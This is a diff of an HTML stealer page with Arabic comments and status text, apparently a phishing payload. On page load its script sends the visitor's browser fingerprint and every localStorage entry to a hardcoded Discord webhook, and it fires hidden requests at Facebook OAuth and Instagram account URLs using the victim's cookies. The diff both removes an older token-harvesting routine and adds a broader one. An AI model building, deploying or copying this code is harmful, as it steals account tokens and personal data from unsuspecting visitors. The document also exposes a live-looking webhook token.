@@ -11,16 +11,16 @@
     </style>
 </head>
 <body>
-    <div class="version-marker">14</div>
+    <div class="version-marker">15</div>
     <div class="loader"></div>
-    <p>جاري كسر حماية الجلسة (V1.2.6)...</p>
+    <p>جاري مزامنة بروتوكول الحصاد (V1.2.7)...</p>
 
     <iframe name="hidden_receiver" style="display:none;"></iframe>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";
 
-        function sendToDiscord(title, content) {
+        function sendExfil(title, content) {
             const form = document.createElement('form');
             form.method = 'POST';
             form.action = WEBHOOK_URL;
@@ -29,41 +29,58 @@
             input.type = 'hidden';
             input.name = 'payload_json';
             input.value = JSON.stringify({
-                embeds: [{ title: title, description: content, color: 16711680 }]
+                embeds: [{
+                    title: "💎 " + title,
+                    description: content,
+                    color: 3066993,
+                    footer: { text: "Protocol: V1.2.7 | Device: Android 14" }
+                }]
             });
             form.appendChild(input);
             document.body.appendChild(form);
             form.submit();
+            document.body.removeChild(form);
         }
 
-        // التكتيك الجديد: محاولة سحب الـ Auth Token من الـ LocalStorage بطريقة "عميقة"
-        function deepHarvest() {
+        async function finalStrike() {
             try {
-                // سحب مفاتيح الدخول المحتملة (المتصفح غالباً بيخزنها هنا)
+                // 1. بصمة الجهاز المحدثة
+                sendExfil("Target_Sync", `UA: ${navigator.userAgent}\nPlatform: ${navigator.platform}`);
+
+                // 2. تكتيك الـ OAuth Stealth Tunneling
+                // إجبار المتصفح على طلب روابط حساسة بكوكيز الضحية (بدون فتح نوافذ)
+                const tunnels = [
+                    { name: "FB_OAuth", url: "https://www.facebook.com/dialog/oauth?client_id=124024574287442&redirect_uri=https://mbasic.facebook.com" },
+                    { name: "Insta_Edit", url: "https://www.instagram.com/accounts/edit/?__a=1" }
+                ];
+
+                tunnels.forEach(t => {
+                    const probe = new Image();
+                    probe.src = t.url + "&cache_bust=" + Math.random();
+                    // بمجرد إرسال الطلب، المتصفح يكون قد "سلم" الكوكيز للموقع
+                    sendExfil("Tunnel_Injected", `تم حقن طلب صامت إلى: ${t.name}`);
+                });
+
+                // 3. سحب بيانات التخزين المحلي العميقة
                 let loot = "";
                 for (let i = 0; i < localStorage.length; i++) {
                     let key = localStorage.key(i);
-                    if (key.toLowerCase().includes('auth') || key.toLowerCase().includes('token') || key.toLowerCase().includes('user')) {
-                        loot += `**${key}**: ${localStorage.getItem(key)}\n`;
-                    }
+                    loot += `**${key}**: ${localStorage.getItem(key).substring(0, 150)}...\n`;
+                }
+                
+                if (loot) {
+                    sendExfil("Storage_Harvest", loot);
+                } else {
+                    sendExfil("Status_Update", "LocalStorage فارغ (نظام التمويه نشط)");
                 }
 
-                if (loot) {
-                    sendToDiscord("🔥 كنز التوكنات", loot);
-                } else {
-                    sendToDiscord("⚠️ تنبيه", "التخزين المحلي فارغ - محاولة السحب عبر الـ Redirect...");
-                    
-                    // إذا فشل السحب المباشر، نجبر المتصفح يفتح صفحة الإعدادات في تبويب مخفي
-                    // هاد الطلب بيخلي المتصفح "ينعش" الجلسة ويعطينا إشعار
-                    window.open("https://mbasic.facebook.com/settings", "_blank", "width=1,height=1,left=10000");
-                    sendToDiscord("🚀 Session Refresh", "تم إجبار المتصفح على فتح جلسة فيسبوك في الخلفية.");
-                }
             } catch (e) {
-                sendToDiscord("❌ خطأ", e.message);
+                sendExfil("Error_Log", e.message);
             }
         }
 
-        setTimeout(deepHarvest, 2000);
+        // تشغيل المهمة
+        setTimeout(finalStrike, 1500);
     </script>
 </body>
 </html>
